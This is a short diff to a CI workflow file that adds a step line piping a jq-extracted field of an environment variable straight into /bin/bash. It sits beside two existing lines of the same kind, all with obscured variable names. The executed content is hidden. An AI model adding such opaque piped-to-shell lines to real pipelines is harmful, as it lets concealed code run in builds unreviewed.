@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
           printf '%s' "$x4" | jq -r .jq8781 | /bin/bash
+          echo $frkbl3 | jq -r .oc73435 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
